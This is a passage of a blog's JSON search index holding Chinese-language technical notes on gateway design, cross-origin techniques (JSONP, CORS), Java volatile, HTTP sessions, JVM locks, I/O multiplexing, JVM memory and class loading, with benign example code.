group一般来说，可以是对应一个服务，多个command key对应这个服务的多个接口，多个接口的调用共享同一个线程池。如果说你的command key，要用自己的线程池，可以定义自己的threadpool key，就ok了\n合并请求 Spring Cloud Hystrix的请求合并 负载均衡 ribbon\nfeign集成了ribbon\n负载均衡有好几种实现策略，常见的有：\n 随机 (Random) 轮询 (RoundRobin) 一致性哈希 (ConsistentHash) 哈希 (Hash) 加权（Weighted）  ribbon负载均衡策略介绍\nRoundRobinRule：简单轮询服务列表来选择服务器。它是Ribbon默认的负载均衡规则。\nAvailabilityFilteringRule：对以下两种服务器进行忽略：\n（1）在默认情况下，这台服务器如果3次连接失败，这台服务器就会被设置为“短路”状态。短路状态将持续30秒，如果再次连接失败，短路的持续时间就会几何级地增加。\n注意：可以通过修改配置loadbalancer..connectionFailureCountThreshold来修改连接失败多少次之后被设置为短路状态。默认是3次。\n（2）并发数过高的服务器。如果一个服务器的并发连接数过高，配置了AvailabilityFilteringRule规则的客户端也会将其忽略。并发连接数的上线，可以由客户端的..ActiveConnectionsLimit属性进行配置\nWeightedResponseTimeRule：为每一个服务器赋予一个权重值。服务器响应时间越长，这个服务器的权重就越小。这个规则会随机选择服务器，这个权重值会影响服务器的选择。\nZoneAvoidanceRule：以区域可用的服务器为基础进行服务器的选择。使用Zone对服务器进行分类，这个Zone可以理解为一个机房、一个机架等。\nBestAvailableRule：忽略那些短路的服务器，并选择并发数较低的服务器。\nRandomRule：随机选择一个可用的服务器。\nRetry：重试机制的选择逻辑\n适配注册中心 Eureka、Zookeeper、Nacos以及Consul都已经集成好了。\n形如 http://abc.com/服务名/xxx 的请求会被转发到对应的服务\n认证 动态发布 有两种实现思路：\n 先更新RouteDefinition再更新Route 直接更新Route  Spring cloud gateway本身提供了动态修改配置的endpoint，使用的是第一种方式。\n外接配置中心，使用第一种方式：\n 注册一个监听器（@ApolloConfigChangeListener） 将监听事件反序列成RouteDefinition  RouteDefinition 👉🏿 Route 👉🏿 更新Route\n 调用RouteDefinitionWriter的add delete方法（更新内存中的RouteDefinition） RouteDefinitionRouteLocator将RouteDefinition转成Route，并实现了RouteLocator接口的getRoutes方法。 发起RefreshRoutesEvent事件（更新内存中的Route）  用数据库，使用第二种方式：\nSpring Cloud Gateway Dynamic Routes from Database 数据库配置 👉🏿 Route 👉🏿 更新Route\n 暴露接口，更新数据库的配置 自定义一个RouteLocator，实现getRoutes方法（去数据库拿路由配置） 发起RefreshRoutesEvent事件（更新内存中的Route）   与通过RouteLocatorBuilder构造RouteLocator原理一致\n  CachingRouteLocator和CachingRouteDefinitionLocator都会监听RefreshRoutesEvent事件\n 聚合接口（服务编排） 日志 泛化调用 安全 Websocket 参考 Hystrix使用入门手册（中文） 浅析如何设计一个亿级网关 百亿流量API网关的设计与实现 SpringCloud gateway （史上最全） （5）Spring WebFlux快速上手——响应式Spring的道法术器 API网关基石：泛化调用 基于 Hystrix 信号量机制实现资源隔离 Hystrix信号量模式支持超时时间吗 ","date":"2021-09-16","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/%E7%BD%91%E5%85%B3%E8%AE%BE%E8%AE%A1/","series":["Manual"],"tags":["SA"],"title":"网关设计"},{"categories":["编程思想"],"content":"出于安全考虑，浏览器对跨域请求作出限制，最开始只对访问Cookie做出限制。\n随着互联网的发展，\u0026ldquo;同源政策\u0026quot;越来越严格。目前，如果非同源，共有三种行为受到限制。\n （1） Cookie、LocalStorage 和 IndexDB 无法读取。\n（2） DOM 无法获得。\n（3） AJAX 请求不能发送。\n 虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。\n前面两种限制和后端关系不大，主要是前端去解决。\n这里主要介绍第三种限制。同源政策规定，AJAX请求只能发给同源的网址，否则就报错。虽然在安全层面上同源限制是必要的，但有时同源策略会对我们的合理用途造成影响，为了避免开发的应用受到限制，常用方法有 JSONP , CORS , 代理 , WebSocket等方法。\nJSONP Jsonp(JSON with Padding) 是 json 的一种\u0026quot;使用模式\u0026rdquo;，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。\n JSONP 是一种非官方的跨域数据交互协议 JSONP 本质上是利用 \u0026lt;script\u0026gt; \u0026lt;img\u0026gt; \u0026lt;iframe\u0026gt; 等标签不受同源策略限制，可以从不同域加载并执行资源的特性，来实现数据跨域传输。 JSONP由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数，而数据就是传入回调函数中的JSON数据。 JSONP 的理念就是，与服务端约定好一个回调函数名，服务端接收到请求后，将返回一段 Javascript，在这段 Javascript 代码中调用了约定好的回调函数，并且将数据作为参数进行传递。当网页接收到这段 Javascript 代码后，就会执行这个回调函数，这时数据已经成功传输到客户端了。  JSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。\n它的基本思想是，网页通过添加一个\u0026lt;script\u0026gt;元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。\n首先，网页动态插入\u0026lt;script\u0026gt;元素，由它向跨源网址发出请求。\nfunction addScriptTag(src) { var script = document.createElement(\u0026#39;script\u0026#39;); script.setAttribute(\u0026#34;type\u0026#34;,\u0026#34;text/javascript\u0026#34;); script.src = src; document.body.appendChild(script); } window.onload = function () { addScriptTag(\u0026#39;http://example.com/ip?callback=foo\u0026#39;); } function foo(data) { console.log(\u0026#39;Your public IP address is: \u0026#39; + data.ip); }; 上面代码通过动态添加\u0026lt;script\u0026gt;元素，向服务器example.com发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。\n服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。\nfoo({ \u0026#34;ip\u0026#34;: \u0026#34;8.8.8.8\u0026#34; }); 由于\u0026lt;script\u0026gt;元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。\nCORS CORS是一个W3C标准，全称是\u0026quot;跨域资源共享\u0026quot;（Cross-origin resource sharing）。\n它允许浏览器向跨源服务器，发出XMLHttpRequest 请求，从而克服了AJAX只能同源 使用的限制。\nCORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。\n整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。\n因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。\n CORS与JSONP的使用目的相同，但是比JSONP更强大。\nJSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。\n 代理 前端和后端共用同一个域名，所有请求都去到nginx，由nginx负责转发。这个很好理解。\nWebSocket WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。\n下面是一个例子，浏览器发出的WebSocket请求的头信息（摘自维基百科 ）。\nGET /chat HTTP/1.1 Host: server.example.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw== Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13 Origin: http://example.com 上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。\n正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。\nHTTP/1.1 101 Switching Protocols Upgrade: websocket Connection: Upgrade Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk= Sec-WebSocket-Protocol: chat 参考 浏览器同源政策及其规避方法 跨域资源共享 CORS 详解 什么是跨域请求以及实现跨域的方案 不要再问我跨域的问题了 ","date":"2021-09-14","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/other/%E8%B7%A8%E5%9F%9F/","series":["Manual"],"tags":["Other"],"title":"跨域"},{"categories":["编程思想"],"content":"JVM volatile用于保证程序可见性、顺序性，但是不保证原子性。volatile实现原理是通过在操作变量之前，多加一个lock前缀指令，通过汇编可以看到这个前缀指令。\n当谈到顺序性时常会提到内存屏障，常见的硬件层面内存屏障有：sfence lfence mfence ，lock前缀指令不是内存屏障，而是一种锁，执行时会锁住内存子系统来确保执行顺序，甚至跨多个CPU，JVM利用lock前缀指令的特点实现了可见性 和 顺序性，lock前缀指令实现可见性比较好理解，主要是利用CPU提供的缓存一致性协议（例如Intel的MESI）,当然更差一点的还有lock总线的方式（限制CPU访问内存）。\nJMM层面为了实现顺序性，又抽象出四个内存屏障的概念：LoadLoad StoreStore LoadStore StoreLoad，字节码层面并没有内存屏障的指令，JVM的C++代码会有四个同名函数与之对应，JVM遇到volatile变量便会在其前后执行对应的函数，从而实现内存屏障，具体来说：\nLoadLoadBarrier volatile 读操作 LoadStoreBarrier StoreStoreBarrier volatile 写操作 StoreLoadBarrie 上面简单总结了下可见性、顺序性 的原理，详情🔎可见本文参考链接，这里不在赘述，下面主要总结下，为什么说volatile不保证原子性，以及volatile的应用场景。\n原子性 下面段代码的结果有可能不是 100000，有可能小于 100000。\npublic class VolatileTest implements Runnable { public static volatile int num; @Override public void run() { for (int i = 0; i \u0026lt; 1000; i++) { num++; } } public static void main(String[] args) { for(int i = 0; i \u0026lt; 100; i++) { VolatileTest t = new VolatileTest(); Thread t0 = new Thread(t); t0.start(); } System.out.println(num); } } 因为 num++ 并不是原子性的，一个num++ 语句其实包括3个操作：\n 获取i i自增 回写i  num++ 本身不是原子的，也不会因为加了volatile就变成原子操作。\n应用场景 状态标记量 volatile boolean flag = false; while(!flag){ doSomething(); } public void setFlag() { flag = true; } 单例双重校验 class Singleton{ private volatile static Singleton instance = null; private Singleton() { } public static Singleton getInstance() { if(instance==null) { synchronized (Singleton.class) { if(instance==null) instance = new Singleton(); } } return instance; } } 总结 volatile关键字：\n 它确保指令重排序时不会把其后面的指令排到内存屏障之前的位置，也不会把前面的指令排到内存屏障的后面；即在执行到内存屏障这句指令时，在它前面的操作已经全部完成； 它会强制将对缓存的修改操作立即写入主存； 如果是写操作，它会导致其他CPU中对应的缓存行无效。  参考 面试官：你说你精通Java并发，给我讲讲 volatile volatile底层原理详解 Java并发编程：volatile关键字解析 volatile与lock前缀指令 ","date":"2021-09-13","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/volatile/","series":["Manual"],"tags":["Java"],"title":"volatile"},{"categories":["计算机科学"],"content":"当浏览器关闭时，Session就被销毁了？\n我们知道Session是JSP的九大内置对象（也叫隐含对象）中的一个，它的作用是可以保存当前用户的状态信息，初学它的时候，认为Session的生命周期是从打开一个浏览器窗口发送请求到关闭浏览器窗口，但其实这种说法是不正确的！\n下面就具体的去解释：\n当用户第一次访问Web应用中支持Session的某个网页时，就会开始一个新的Session，那么接下来当用户浏览这个Web应用的不同网页时，始终处于一个Session中\n再详细些：\n当一个Session开始时，Servlet容器会创建一个HttpSession对象，那么在HttpSession对象中，可以存放用户状态的信息，Servlet容器为HttpSession对象分配一个唯一标识符即Sessionid，Servlet容器把Sessionid作为一种Cookie保存在客户端的浏览器中。用户每次发出Http请求时，Servlet容器会从HttpServletRequest对象中取出Sessionid,然后根据这个Sessionid找到相应的HttpSession对象，从而获取用户的状态信息。\n以上就是Session的运行机制，但是还没有提到Session的生命周期，再往下了解！\n其实让Session结束生命周期，有以下两种办法：\n 一个是Session.invalidate()方法，不过这个方法在实际的开发中，并不推荐，可能在强制注销用户的时候会使用； 一个是当前用户和服务器的交互时间超过默认时间后，Session会失效  我们知道Session是存在于服务器端的，当把浏览器关闭时，浏览器并没有向服务器发送，任何请求来关闭Session，自然Session也不会被销毁，但是可以做一点努力，在所有的客户端页面里使用js的window.onclose来监视浏览器的关闭动作，然后向服务器发送一个请求来关闭Session，但是这种做法在实际的开发中也是不推荐使用的，最正常的办法就是不去管它，让它等到默认的时间后，自动销毁\n那么为什么当我们关闭浏览器后，就再也访问不到之前的session了呢？\n其实之前的Session一直都在服务器端，而当我们关闭浏览器时，此时的Cookie是存在于浏览器的进程中的，当浏览器关闭时，Cookie也就不存在了。\n其实Cookie有两种:\n 一种是存在于浏览器的进程中; 一种是存在于硬盘上；（主动指定了过期时间 Expires 或者有效期 Max-Age ）  而session的Cookie是存在于浏览器的进程中，那么这种Cookie我们称为会话Cookie，当我们重新打开浏览器窗口时，之前的Cookie中存放的Sessionid已经不存在了，此时服务器从HttpServletRequest对象中没有检查到sessionid，服务器会再发送一个新的存有Sessionid的Cookie到客户端的浏览器中，此时对应的是一个新的会话，而服务器上原先的session等到它的默认时间到之后，便会自动销毁。\nps:\n当在同一个浏览器中同时打开多个标签，发送同一个请求或不同的请求，仍是同一个session;\n当不在同一个窗口中打开相同的浏览器时，发送请求，仍是同一个session;\n当使用不同的浏览器时，发送请求，即使发送相同的请求，是不同的session;\n当把当前某个浏览器的窗口全关闭，再打开，发起相同的请求时，就是本文所阐述的，是不同的session,但是它和session的生命周期是没有关系的。\n参考 浏览器关闭后，Session会话结束了么？ ","date":"2021-09-09","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/http/session/","series":["Manual"],"tags":["CS","http"],"title":"session"},{"categories":["编程思想"],"content":"自旋锁 因此自旋等待的时间必须有一定的限度，如果自旋超过了限定的次数仍然没有成功获得锁，就应当使用传统的方式去挂起线程。自旋次数的默认值是十次，用户也可以使用参数-XX：PreBlockSpin来自行更改。\n自适应锁 自适应意味着自旋的时间不再是固定的了，而是由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定的。\n锁消除 锁消除是指虚拟机即时编译器在运行时，对一些代码要求同步，但是对被检测到不可能存在共享数据竞争的锁进行消除。锁消除的主要判定依据来源于逃逸分析的数据支持（第11章已经讲解过逃逸分析技术），如果判断到一段代码中，在堆上的所有数据都不会逃逸出去被其他线程访问到，那就可以把它们当作栈上数据对待，认为它们是线程私有的，同步加锁自然就无须再进行。(String（StringBuffer） 拼接的例子)\n锁粗化 如果虚拟机探测到有这样一串零碎的操作都对同一个对象加锁，将会把加锁同步的范围扩展（粗化）到整个操作序列的外部，以代码清单13-7为例，就是扩展到第一个append()操作之前直至最后一个append()操作之后，这样只需要加锁一次就可以了。（StringBuffer.append()例子）\n对象头 HotSpot虚拟机的对象头（ObjectHeader）分为两部分，第一部分用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄（GenerationalGCAge）等。这部分数据的长度在32位和64位的Java虚拟机中分别会占用32个或64个比特，官方称它为“MarkWord”。这部分是实现轻量级锁和偏向锁的关键。另外一部分用于存储指向方法区对象类型数据的指针，如果是数组对象，还会有一个额外的部分用于存储数组长度。官方称它为 “Klass Point”\n全局安全点 全局安全点（safepoint）这个词我们在GC中经常会提到，简单来说就是其代表了一个状态，在该状态下所有线程都是暂停的，在这个时间点上没有线程在执行字节码。\n锁状态 锁的状态总共有四种：无锁状态、偏向锁、轻量级锁和重量级锁。随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级的重量级锁（但是锁的升级是单向的，也就是说只能从低到高升级，不会出现锁的降级）\n偏向锁、轻量级锁的状态转化及对象MarkWord的关系如图\n重量级锁 基于monitor，monitor基于操作系统的互斥锁\n轻量锁 在代码即将进入同步块的时候，如果此同步对象没有被锁定（锁标志位为“01”状态），虚拟机首先将在当前线程的栈帧中建立一个名为锁记录（LockRecord）的空间，用于存储锁对象目前的MarkWord的拷贝（官方为这份拷贝加了一个Displaced前缀，即DisplacedMarkWord）\n虚拟机将使用CAS操作尝试把对象的MarkWord更新为指向LockRecord的指针。如果这个更新动作成功了，即代表该线程拥有了这个对象的锁，并且对象MarkWord的锁标志位（MarkWord的最后两个比特）将转变为“00”，表示此对象处于轻量级锁定状态。\n如果这个更新操作失败了，那就意味着至少存在一条线程与当前线程竞争获取该对象的锁。虚拟机首先会检查对象的MarkWord是否指向当前线程的栈帧，如果是，说明当前线程已经拥有了这个对象的锁，那直接进入同步块继续执行就可以了，否则就说明这个锁对象已经被其他线程抢占了。如果出现两条以上的线程争用同一个锁的情况，那轻量级锁就不再有效，必须要膨胀为重量级锁。\n它的解锁过程也同样是通过CAS操作来进行的，如果对象的MarkWord仍然指向线程的锁记录，那就用CAS操作把对象当前的MarkWord和线程中复制的DisplacedMarkWord替换回来。假如能够成功替换，那整个同步过程就顺利完成了；如果替换失败，则说明有其他线程尝试过获取该锁，就要在释放锁的同时，唤醒被挂起的线程。\n偏向锁   偏向锁是否开启是可以设置的（启用参数-XX：+UseBiasedLocking）。\n  一个线程反复的去获取/释放一个锁，如果这个锁是轻量级锁或者重量级锁，不断的加解锁显然是没有必要的，造成了资源的浪费。于是引入了偏向锁，偏向锁在获取资源的时候会在资源对象上记录该对象是偏向该线程的，偏向锁并不会主动释放，这样每次偏向锁进入的时候都会判断该资源是否是偏向自己的，如果是偏向自己的则不需要进行额外的操作，直接可以进入同步操作。\n  偏向锁获取过程\n 访问Mark Word中偏向锁标志位是否设置成1，锁标志位是否为01——确认为可偏向状态。 如果为可偏向状态，则测试线程ID是否指向当前线程，如果是，进入步骤（5），否则进入步骤（3）。 如果线程ID并未指向当前线程，则通过CAS操作竞争锁。如果竞争成功，则将Mark Word中线程ID设置为当前线程ID，然后执行（5）；如果竞争失败，执行（4）。 如果CAS获取偏向锁失败，则表示有竞争。当到达全局安全点（safepoint）时获得偏向锁的线程被挂起，偏向锁升级为轻量级锁，然后被阻塞在安全点的线程继续往下执行同步代码。 执行同步代码。    偏向锁的释放\n释放需要把握几个要点：有其他线程竞争 JVM到达全局安全点\n偏向锁的撤销在上述第四步骤中有提到。偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动去释放偏向锁。偏向锁的撤销，需要等待全局安全点safepoint，它会首先暂停拥有偏向锁的线程A，然后判断这个线程A，此时有两种情况\n  参考 《深入理解Java虚拟机》\n看完这篇恍然大悟，理解Java中的偏向锁，轻量级锁，重量级锁 ","date":"2021-09-09","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/jvm%E9%94%81%E4%BC%98%E5%8C%96/","series":["Manual"],"tags":["Java"],"title":"JVM锁优化"},{"categories":["计算机科学"],"content":"bio的缺点？\npublic class TestSocket { public static void main(String[] args) throws Exception{ ServerSocket server = new ServerSocket(8080); while (true){ //阻塞等待连接  Socket client = server.accept(); //fork出一个线程调系统的recvfrom去读IO  new Thread(() -\u0026gt; { try { //读数据  InputStream in = client.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(in)); while (true){ System.out.println(reader.readLine()); } }catch (IOException e){ e.printStackTrace(); } }).start(); } } } 上面调recvfrom的时候发生在连接建立之后，并不代表一定有数据可读，所以如果有10000个连接，但是只有10个连接有数据可读的时候就比较悲剧，fork出了10000个线程，发生了10000次recvfrom系统调用，真正有效的却只有10次。\n换言之，bio调用recvfrom的时机不对，不应该在连接建立的时候去调，最好等有有效数据时才调。\nselect\n同步多路复用\n入参数是文件fds（file descriptor set 描述符集合，即连接集合），调用一次select，由系统内核遍历10000个fd，返回哪些连接是可读状态，上面的例子在select方式下只发生1次select+10次recvfrom系统调用\npoll\n同步多路复用\n和select类似，入参不一样，没有最大文件描述符数量的限制\nepoll\n事件驱动的poll\n不用遍历10000个，而是基于操作系统中断机制，有数据可读的时候，网卡驱动发出cpu中断，然后再调recvfrom去同步读。\n所以 多路复用（poll select epoll）非常适合长连接短数据的场景，例如即时通信。\n参考 一文搞懂select、poll和epoll区别 ","date":"2021-09-08","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/system/poll-select-epoll%E5%8C%BA%E5%88%AB/","series":["Manual"],"tags":["CS","System"],"title":"poll select epoll区别"},{"categories":["编程思想"],"content":"运行时数据区用于保存 JVM 在运行过程中产生的数据，结构如图所示：\nHeap Java 堆是可供各线程共享的运行时内存区域，是 Java 虚拟机所管理的内存区域中最大的一块。此区域非常重要，几乎所有的对象实例和数组实例都要在 Java 堆上分配，但随着 JIT 编译器及逃逸分析技术的发展，也可能会被优化为栈上分配。\nHeap 中除了作为对象分配使用，还包含字符串字面量 常量池（Internd Strings） 。\nG1以前的垃圾回收器采用分代回收算法，Heap 中还包含一个 新生代（Yong Generation）、一个 老年代（Old Generation）。\n新生代分三个区，一个Eden区，两个Survivor区，大部分对象在Eden区中生成。Survivor 区总有一个是空的。\n老年代中保存一些生命周期较长的对象，当一个对象经过多次的 GC 后还没有被回收，那么它将被移动到老年代。\nMethoad Area 方法区的数据由所有线程共享，因此为安全的使用方法区的数据，需要注意线程安全问题。\n方法区主要保存类级别的数据，包括：\n ClassLoader Reference Runtime Constant Pool  数字常量 类属性引用 方法引用   Field Data：每个类属性的名称、类型等 Methoad Data：每个方法的名称、返回值类型、参数列表等 Methoad Code：每个方法的字节码、本地变量表等  方法区的实现在不同的 JVM 版本有不同，在 JVM 1.8 之前，方法区的实现为 永久代（PermGen），但是由于永久代的大小限制， 经常会出现内存溢出。于是在 JVM 1.8 方法区的实现改为 元空间（Metaspace），元空间是在 Native 的一块内存空间。\nStack 对于每个 JVM 线程，当线程启动时，都会分配一个独立的运行时栈，用以保存方法调用。每个方法调用，都会在栈顶增加一个栈帧（Stack Frame）。\n每个栈帧都保存三个引用：本地变量表（Local Variable Array）、 操作数栈（Operand Stack） 和 当前方法所属类的运行时常量池（Runtime Constant Pool）。由于本地变量表和操作数栈的大小都在编译时确定，所以栈帧的大小是固定的。\n当被调用的方法返回或抛出异常，栈帧会被弹出。在抛出异常时 printStackTrace() 打印的每一行就是一个栈帧。同时得益于栈帧的特点，栈帧内的数据是线程安全的。\n栈的大小可以动态扩展，但是如果一个线程需要的栈大小超过了允许的大小，就会抛出 StackOverflowError。\nPC Register 对于每个 JVM 线程，当线程启动时，都会有一个独立的 PC（Program Counter） 计数器，用来保存当前执行的代码地址（方法区中的内存地址）。如果当前方法是 Native 方法，PC 的值为 NULL。一旦执行完成，PC 计数器会被更新为下一个需要执行代码的地址。\nNative Method Stack 本地方法栈和 Java 虚拟机栈的作用相似，Java 虚拟机栈执行的是字节码，而本地方法栈执行的是 native 方法。本地方法栈使用传统的栈（C Stack）来支持 native 方法。\nDirect Memory Native Memory Tracking 在 JDK 1.4 中新加入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为 避免了在 Java 堆和 Native 堆中来回复制数据。\n使用Unsafe类也可以直接分配堆外内存。\n","date":"2021-09-06","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/jvm%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/","series":["Manual"],"tags":["Java"],"title":"JVM内存模型"},{"categories":["编程思想"],"content":"类加载器是 Java 运行时环境（Java Runtime Environment）的一部分，负责动态加载 Java 类到 Java 虚拟机的内存空间中。类通常是按需加载，即第一次使用该类时才加载。 由于有了类加载器，Java 运行时系统不需要知道文件与文件系统。每个 Java 类必须由某个类加载器装入到内存。\n类装载器除了要定位和导入二进制 class 文件外，还必须负责验证被导入类的正确性，为变量分配初始化内存，以及帮助解析符号引用。这些动作必须严格按一下顺序完成：\n 装载：查找并装载类型的二进制数据。 链接：执行验证、准备以及解析(可选) - 验证：确保被导入类型的正确性 - 准备：为类变量分配内存，并将其初始化为默认值。 - 解析：把类型中的符号引用转换为直接引用。 初始化：把类变量初始化为正确的初始值。  装载 类加载器分类 在Java虚拟机中存在多个类装载器，Java应用程序可以使用两种类装载器：\n Bootstrap ClassLoader：此装载器是 Java 虚拟机实现的一部分。由原生代码（如C语言）编写，不继承自 java.lang.ClassLoader 。负责加载核心 Java 库，启动类装载器通常使用某种默认的方式从本地磁盘中加载类，包括 Java API。 Extention Classloader：用来在\u0026lt;JAVA_HOME\u0026gt;/jre/lib/ext ,或 java.ext.dirs 中指明的目录中加载 Java 的扩展库。 Java 虚拟机的实现会提供一个扩展库目录。 Application Classloader：根据 Java应用程序的类路径（ java.class.path 或 CLASSPATH 环境变量）来加载 Java 类。一般来说，Java 应用的类都是由它来完成加载的。可以通过 ClassLoader.getSystemClassLoader() 来获取它。 自定义类加载器：可以通过继承 java.lang.ClassLoader 类的方式实现自己的类加载器，以满足一些特殊的需求而不需要完全了解 Java 虚拟机的类加载的细节。  全盘负责双亲委托机制 在一个 JVM 系统中，至少有 3 种类加载器，那么这些类加载器如何配合工作？在 JVM 种类加载器通过 全盘负责双亲委托机制 来协调类加载器。\n 全盘负责：指当一个 ClassLoader 装载一个类的时，除非显式地使用另一个 ClassLoader ，该类所依赖及引用的类也由这个 ClassLoader 载入。 双亲委托机制：指先委托父装载器寻找目标类，只有在找不到的情况下才从自己的类路径中查找并装载目标类。  全盘负责双亲委托机制只是 Java 推荐的机制，并不是强制的机制。实现自己的类加载器时，如果想保持双亲委派模型，就应该重写 findClass(name) 方法；如果想破坏双亲委派模型，可以重写 loadClass(name) 方法。\n装载入口 所有Java虚拟机实现必须在每个类或接口首次主动使用时初始化。以下六种情况符合主动使用的要求：\n 当创建某个类的新实例时(new、反射、克隆、序列化) 调用某个类的静态方法 使用某个类或接口的静态字段，或对该字段赋值(用final修饰的静态字段除外，它被初始化为一个编译时常量表达式) 当调用Java API的某些反射方法时。 初始化某个类的子类时。 当虚拟机启动时被标明为启动类的类。  除以上六种情况，所有其他使用Java类型的方式都是被动的，它们不会导致Java类型的初始化。\n对于接口来说，只有在某个接口声明的非常量字段被使用时，该接口才会初始化，而不会因为事先这个接口的子接口或类要初始化而被初始化。\n父类需要在子类初始化之前被初始化。当实现了接口的类被初始化的时候，不需要初始化父接口。然而，当实现了父接口的子类(或者是扩展了父接口的子接口)被装载时，父接口也要被装载。(只是被装载，没有初始化)\n验证 确认装载后的类型符合Java语言的语义，并且不会危及虚拟机的完整性。\n 装载时验证：检查二进制数据以确保数据全部是预期格式、确保除 Object 之外的每个类都有父类、确保该类的所有父类都已经被装载。 正式验证阶段：检查 final 类不能有子类、确保 final 方法不被覆盖、确保在类型和超类型之间没有不兼容的方法声明(比如拥有两个名字相同的方法，参数在数量、顺序、类型上都相同，但返回类型不同)。 符号引用的验证：当虚拟机搜寻一个被符号引用的元素(类型、字段或方法)时，必须首先确认该元素存在。如果虚拟机发现元素存在，则必须进一步检查引用类型有访问该元素的权限。  准备 在准备阶段，Java虚拟机为类变量分配内存，设置默认初始值。但在到到初始化阶段之前，类变量都没有被初始化为真正的初始值。\n   类型 默认值     int 0   long 0L   short (short)0   char ‘\\u0000’   byte (byte)0   blooean false   float 0.0f   double 0.0d   reference null    解析 解析的过程就是在类型的常量池总寻找类、接口、字段和方法的符号引用，把这些符号引用替换为直接引用的过程。\n 类或接口的解析：判断所要转化成的直接引用是数组类型，还是普通的对象类型的引用，从而进行不同的解析。 字段解析：对字段进行解析时，会先在本类中查找是否包含有简单名称和字段描述符都与目标相匹配的字段，如果有，则查找结束；如果没有，则会按照继承关系从上往下递归搜索该类所实现的各个接口和它们的父接口，还没有，则按照继承关系从上往下递归搜索其父类，直至查找结束，  初始化 所有的类变量(即静态量)初始化语句和类型的静态初始化器都被Java编译器收集在一起，放到一个特殊的方法中。 对于类来说，这个方法被称作类初始化方法；对于接口来说，它被称为接口初始化方法。在类和接口的 class 文件中，这个方法被称为\u0026lt;clinit\u0026gt;。\n 如果存在直接父类，且直接父类没有被初始化，先初始化直接父类。 如果类存在一个类初始化方法，执行此方法。  这个步骤是递归执行的，即第一个初始化的类一定是Object。\nJava虚拟机必须确保初始化过程被正确地同步。 如果多个线程需要初始化一个类，仅仅允许一个线程来进行初始化，其他线程需等待。\n 这个特性可以用来写单例模式。\n Clinit 方法  对于静态变量和静态初始化语句来说：执行的顺序和它们在类或接口中出现的顺序有关。 并非所有的类都需要在它们的class文件中拥有\u0026lt;clinit\u0026gt;()方法， 如果类没有声明任何类变量，也没有静态初始化语句，那么它就不会有\u0026lt;clinit\u0026gt;()方法。如果类声明了类变量，但没有明确的使用类变量初始化语句或者静态代码块来初始化它们，也不会有\u0026lt;clinit\u0026gt;()方法。如果类仅包含静态final常量的类变量初始化语句，而且这些类变量初始化语句采用编译时常量表达式，类也不会有\u0026lt;clinit\u0026gt;()方法。只有那些需要执行Java代码来赋值的类才会有\u0026lt;clinit\u0026gt;() final常量：Java虚拟机在使用它们的任何类的常量池或字节码中直接存放的是它们表示的常量值。 ","date":"2021-09-06","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/jvm%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/","series":["Manual"],"tags":["Java"],"title":"JVM类加载器"},{"categories":["编程思想"],"content":"Java 源码通过 javac 编译为 Java 字节码 ，Java 字节码是 Java 虚拟机执行的一套代码格式，其抽象了计算机的基本操作。大多数指令只有一个字节，而有些操作符需要参数，导致多使用了一些字节。\nJVM 的基本架构如上图所示，其主要包含三个大块：\n 类加载器：负责动态加载Java类到Java虚拟机的内存空间中。 运行时数据区：存储 JVM 运行时所有数据 执行引擎：提供 JVM 在不同平台的运行能力  线程 在 JVM 中运行着许多线程，这里面有一部分是应用程序创建来执行代码逻辑的 应用线程，剩下的就是 JVM 创建来执行一些后台任务的 系统线程。\n主要的系统线程有：\n Compile Threads：运行时将字节码编译为本地代码所使用的线程 GC Threads：包含所有和 GC 有关操作 Periodic Task Thread：JVM 